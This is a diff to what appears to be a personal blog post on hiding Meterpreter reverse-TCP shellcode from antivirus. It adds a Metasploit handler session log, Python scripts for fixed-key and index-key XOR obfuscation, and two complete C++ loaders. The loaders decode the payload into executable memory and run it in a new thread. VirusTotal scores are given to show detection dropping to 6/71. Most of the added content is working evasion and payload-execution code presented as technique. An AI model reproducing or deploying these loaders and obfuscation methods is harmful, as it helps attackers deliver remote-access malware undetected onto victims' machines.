@@ -46,6 +46,25 @@ unsigned char buf[] =
 {% endhighlight %}
 
 <br>
+Successful shellcode execution criteria is a meterpreter session. This criteria must be met for all obfuscation techniques applied below.
+
+{% highlight cpp %}
+msf6 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
+lhost => 0.0.0.0
+msf6 exploit(multi/handler) > set lport 443
+lport => 443
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 0.0.0.0:443 
+[*] Sending stage (175174 bytes) to 10.0.0.129
+[*] Meterpreter session 1 opened (10.0.0.128:443 -> 10.0.0.129:49800 ) at 2023-09-15 04:44:34 -0400
+{% endhighlight %}
+
+<br>
 ### 2. Baseline
 Before attempting any obfuscation and anti-virus bypasses. I will throw this tested baseline sample into Virustotal.
 
@@ -64,8 +83,119 @@ int main() {
 
 <br>
 Here are the results. Extremely strange that only 26/70 vendors flagged this sample, considering it has no protection mechanisms at all. 
-![vt_baseline](/assets/post_assets/embedded-shellcode-obfuscationn/vt_baseline.png)
+SHA256: 1d2c5660e52b21d7a690d1d76af0f734e3b1bb59d6beff3f94c51c1296b6d92b
+
+![vt_baseline](/assets/post_assets/embedded-shellcode-obfuscation/vt_baseline.png)
 
 
 <br>
-### 3. Static Shellcode Obfuscation 
+### 3. XOR Shellcode Obfuscation 
+The XOR operation is widely used for obfuscation; used especially in malware for hiding data/payloads, packing, mangling strings, and really anything under the sun. In this chapter, I will experiment with 2 different XOR obfuscation techniques:
+
++ Fixed-Key XOR - each byte of the payload will be XORed with the fixed value 0x27.
++ Index-Key XOR - each byte of the payload will be XORed with its index.
+
+The objective here is to understand if it matters - how obfuscated the payload is.
+
+<br>
+#### 3.1. Fixed-Key XOR
+I wrote a simple python script to assist with the obfuscation.
+
+{% highlight python %}
+def obfuscate_fixed_xor(payload_intarray: list):
+    obfuscated_intarray = []
+    for i in payload_intarray:
+        new_int = i ^ 0x27
+        obfuscated_intarray.append(new_int)
+
+    return obfuscated_intarray
+{% endhighlight %}
+
+<br>
+The C++ deobfuscation routine.
+
+{% highlight cpp %}
+#include <windows.h>
+
+void deobfuscate(unsigned char* deobfuscated_payload) {
+    int new_int {0};
+    for (int index {0}; index < sizeof(payload); index++) {
+        new_int = payload[index] ^ 0x27;
+        deobfuscated_payload[index] = new_int;
+    }
+}
+
+int main() {
+    LPVOID memory = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    unsigned char deobfuscated_payload[sizeof(payload)];
+    deobfuscate(deobfuscated_payload);
+    memcpy(memory, deobfuscated_payload, sizeof(deobfuscated_payload));
+
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) memory, 0, 0, NULL);
+    WaitForSingleObject(hThread, INFINITE);
+    return 0;
+}
+{% endhighlight %}
+
+<br>
+Huge improvement in bypassing static antivirus scans.
+SHA256: 0e247e2d325514022ca189b4f1d67ae6d8cec890f561a97e8857c6967df5902b
+
+![vt_index_xor](/assets/post_assets/embedded-shellcode-obfuscation/)
+
+
+<br>
+#### 3.2. Index-Key XOR
+As above, a python script to automate the obfuscation. This time, each byte in the payload will be XORed with its respective index (mod 0xff, to keep within 8 bits).
+
+{% highlight python %}
+def obfuscate_index_xor(payload_intarray: list):
+    obfuscated_intarray = []
+    for index in range(len(payload_intarray)):
+        xor = index % 0xff
+        new_int = payload_intarray[index] ^ xor
+        obfuscated_intarray.append(new_int)
+    
+    return obfuscated_intarray
+{% endhighlight %}
+
+<br>
+The exact same deobfuscation routine, but written in C++.
+
+{% highlight cpp %}
+#include <windows.h>
+
+void deobfuscate(unsigned char* deobfuscated_payload) {
+    int xor {0};
+    int new_int {0};
+    for (int index {0}; index < sizeof(payload); index++) {
+        xor = index % 0xff;
+        new_int = payload[index] ^ xor;
+        deobfuscated_payload[index] = new_int;
+    }
+}
+
+int main() {
+    LPVOID memory = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    unsigned char deobfuscated_payload[sizeof(payload)];
+    deobfuscate(deobfuscated_payload);
+    memcpy(memory, deobfuscated_payload, sizeof(deobfuscated_payload));
+
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) memory, 0, 0, NULL);
+    WaitForSingleObject(hThread, INFINITE);
+    return 0;
+}
+{% endhighlight %}
+
+<br>
+The results - 6/71 vendors detected. Same as the Fixed-XOR technique
+SHA256: 7d7710c28190bc5d49187fd99bf042574705b57454ad770e7239b602596ddfbf
+
+![vt_index_xor](/assets/post_assets/embedded-shellcode-obfuscation//vt_index_xor.png)
+
+
+<br>
+#### 3.3. XOR Summary
+Both the Fixed-XOR and Index-XOR scored the same 6/71 score on VirusTotal. This meant that even Fixed-XOR hid the shellcode successfully, and it doesn't matter the depth of the shellcode obfuscation. This suggests that the remaining 6 vendors detected other traits of the malicious file - likely the plaintext WinAPIs - and other patterns yet unknown (to me).
